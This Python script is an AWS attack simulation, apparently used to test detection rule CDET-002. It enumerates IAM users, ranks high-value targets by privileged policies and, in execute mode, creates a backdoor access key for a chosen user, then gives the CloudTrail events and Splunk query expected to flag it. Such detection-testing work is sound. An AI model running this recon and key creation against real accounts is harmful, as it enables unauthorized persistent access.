#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              ATTACK SIMULATION — AUTHORIZED USE ONLY                        ║
║  CDET-002: IAM Access Key Created for Existing User                          ║
║  Tactic: Persistence | T1098.001 — Account Manipulation: Additional Creds    ║
║                                                                              ║
║  This script simulates adding a backdoor access key to an existing IAM user. ║
║  Run ONLY in authorized test environments with explicit written approval.    ║
║  Unauthorized use against production systems may violate computer fraud laws.║
╚══════════════════════════════════════════════════════════════════════════════╝

Usage:
    # Dry-run (default — prints actions only):
    python simulate.py --target-username alice

    # Execute mode:
    python simulate.py --target-username alice --execute

    # Execute with automatic cleanup:
    python simulate.py --target-username alice --execute --cleanup

    # List users and identify high-value targets (read-only, always safe):
    python simulate.py --list-targets
"""

import argparse
import logging
import sys
import time
from typing import Optional

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("cdet002-sim")

# ---------------------------------------------------------------------------
# CloudTrail events this simulation generates
# ---------------------------------------------------------------------------
CLOUDTRAIL_EVENTS = [
    "iam:ListAccessKeys        → eventName=ListAccessKeys  (reconnaissance)",
    "iam:CreateAccessKey       → eventName=CreateAccessKey (primary detection trigger)",
]

PRIVILEGED_POLICY_KEYWORDS = ["AdministratorAccess", "FullAccess", "PowerUser", "SecurityAudit"]


# ---------------------------------------------------------------------------
# Reconnaissance helpers
# ---------------------------------------------------------------------------

def list_high_value_targets(iam_client) -> list[dict]:
    """
    Enumerate IAM users and identify high-value targets based on attached policies.
    This is a read-only operation and is always safe to run.
    """
    log.info("Enumerating IAM users to identify high-value targets...")
    targets = []

    try:
        paginator = iam_client.get_paginator("list_users")
        for page in paginator.paginate():
            for user in page["Users"]:
                username = user["UserName"]

                # Check attached policies
                attached = iam_client.list_attached_user_policies(UserName=username)
                privileged_policies = [
                    p["PolicyName"]
                    for p in attached.get("AttachedPolicies", [])
                    if any(kw in p["PolicyName"] for kw in PRIVILEGED_POLICY_KEYWORDS)
                ]

                # Check existing key count
                keys = iam_client.list_access_keys(UserName=username)
                key_count = len(keys.get("AccessKeyMetadata", []))

                targets.append({
                    "username": username,
                    "privileged_policies": privileged_policies,
                    "key_count": key_count,
                    "is_high_value": len(privileged_policies) > 0,
                    "can_add_key": key_count < 2,
                })
    except ClientError as exc:
        log.error("Failed to enumerate users: %s", exc)

    return targets


def print_targets(targets: list[dict]) -> None:
    """Print a formatted table of discovered targets."""
    log.info("=" * 70)
    log.info("IAM User Enumeration Results:")
    log.info("%-30s %-10s %-10s %s", "Username", "Keys", "HighValue", "Privileged Policies")
    log.info("-" * 70)
    for t in targets:
        marker = "*** " if t["is_high_value"] else "    "
        log.info(
            "%s%-26s %-10s %-10s %s",
            marker,
            t["username"],
            f"{t['key_count']}/2",
            "YES" if t["is_high_value"] else "no",
            ", ".join(t["privileged_policies"]) or "none",
        )
    log.info("=" * 70)


# ---------------------------------------------------------------------------
# Core simulation
# ---------------------------------------------------------------------------

def create_backdoor_key(
    iam_client,
    target_username: str,
    dry_run: bool,
) -> Optional[str]:
    """
    Create an access key for the target user.

    Returns the new AccessKeyId on success, None on failure.
    The SecretAccessKey is intentionally NOT returned or stored.
    """
    # First check key count
    try:
        keys = iam_client.list_access_keys(UserName=target_username)
        key_count = len(keys.get("AccessKeyMetadata", []))
        log.info("Target user '%s' currently has %d/2 access keys", target_username, key_count)

        if key_count >= 2:
            log.error(
                "Cannot create new key: user '%s' already has 2 access keys (AWS limit). "
                "Deleting one first would generate a noisy DeleteAccessKey event.",
                target_username,
            )
            return None
    except ClientError as exc:
        log.error("Cannot check key count for '%s': %s", target_username, exc)
        return None

    if dry_run:
        log.info("[DRY-RUN] Would call: iam.create_access_key(UserName='%s')", target_username)
        log.info("[DRY-RUN] New AccessKeyId would be: AKIADRYRUNXXXXXXXX (simulated)")
        log.info("[DRY-RUN] SecretAccessKey: NOT logged anywhere (by design)")
        return "AKIADRYRUNXXXXXXXX"

    # WARNING: This creates a real access key that grants access to the target user's permissions.
    log.warning(
        "EXECUTING: iam.create_access_key(UserName='%s') — real write operation",
        target_username,
    )
    try:
        response = iam_client.create_access_key(UserName=target_username)
        key_id = response["AccessKey"]["AccessKeyId"]
        # Intentionally NOT logging the SecretAccessKey
        log.info("Created access key for '%s': KeyId=%s", target_username, key_id)
        log.warning(
            "SecretAccessKey was returned by AWS but is NOT stored by this script. "
            "In a real attack, the adversary would exfiltrate this value."
        )
        return key_id
    except ClientError as exc:
        log.error("Failed to create access key for '%s': %s", target_username, exc)
        return None


def cleanup_key(
    iam_client,
    target_username: str,
    key_id: str,
    dry_run: bool,
) -> None:
    """Delete the created backdoor access key."""
    if dry_run:
        log.info(
            "[DRY-RUN] Would call: iam.delete_access_key(UserName='%s', AccessKeyId='%s')",
            target_username,
            key_id,
        )
        return

    # WARNING: This permanently deletes the access key.
    log.warning(
        "EXECUTING: iam.delete_access_key(UserName='%s', AccessKeyId='%s')",
        target_username,
        key_id,
    )
    try:
        iam_client.delete_access_key(UserName=target_username, AccessKeyId=key_id)
        log.info("Deleted access key %s from user %s", key_id, target_username)
    except ClientError as exc:
        log.error("Failed to delete key %s: %s", key_id, exc)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CDET-002: Simulate access key creation for an existing IAM user (T1098.001)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python simulate.py --list-targets
  python simulate.py --target-username alice
  python simulate.py --target-username alice --execute
  python simulate.py --target-username alice --execute --cleanup
        """,
    )
    parser.add_argument(
        "--target-username",
        type=str,
        help="Existing IAM username to create a backdoor key for",
    )
    parser.add_argument(
        "--region",
        type=str,
        default="us-east-1",
        help="AWS region (default: us-east-1)",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        default=False,
        help="Actually execute AWS API calls. Without this flag, runs in dry-run mode.",
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        default=False,
        help="Delete the created key after simulation (requires --execute)",
    )
    parser.add_argument(
        "--list-targets",
        action="store_true",
        default=False,
        help="Enumerate IAM users and identify high-value targets (read-only, always safe)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    dry_run = not args.execute

    # Build boto3 session — no hardcoded credentials
    session = boto3.Session(region_name=args.region)
    iam = session.client("iam")
    sts = session.client("sts")

    # Verify caller identity
    try:
        identity = sts.get_caller_identity()
        log.info(
            "Running as: %s (Account: %s)",
            identity["Arn"],
            identity["Account"],
        )
    except ClientError as exc:
        log.error("Cannot determine caller identity: %s", exc)
        return 1

    # List-targets mode (read-only, always safe)
    if args.list_targets:
        targets = list_high_value_targets(iam)
        print_targets(targets)
        return 0

    if not args.target_username:
        log.error("--target-username is required unless --list-targets is specified")
        return 1

    if dry_run:
        log.info("=" * 70)
        log.info("DRY-RUN MODE — No AWS API calls will be made")
        log.info("Pass --execute to run the simulation for real")
        log.info("=" * 70)
    else:
        log.warning("=" * 70)
        log.warning("EXECUTE MODE — Real AWS API calls WILL be made")
        log.warning("A new access key will be created for: %s", args.target_username)
        log.warning("Ensure you are running in an authorized test environment")
        log.warning("=" * 70)
        time.sleep(2)

    log.info("CloudTrail events that will be generated:")
    for event in CLOUDTRAIL_EVENTS:
        log.info("  %s", event)

    # Run simulation
    key_id = create_backdoor_key(iam, args.target_username, dry_run)
    if key_id is None:
        log.error("Simulation failed — see errors above")
        return 1

    log.info("Simulation complete.")
    log.info(
        "Expected CDET-002 alert in Splunk: "
        "index=aws_cloudtrail eventName=CreateAccessKey requestParameters.userName=%s",
        args.target_username,
    )

    # Optional cleanup
    if args.cleanup:
        log.info("Cleanup: waiting 30 seconds for CloudTrail event propagation...")
        if not dry_run:
            time.sleep(30)
        cleanup_key(iam, args.target_username, key_id, dry_run)

    return 0


if __name__ == "__main__":
    sys.exit(main())
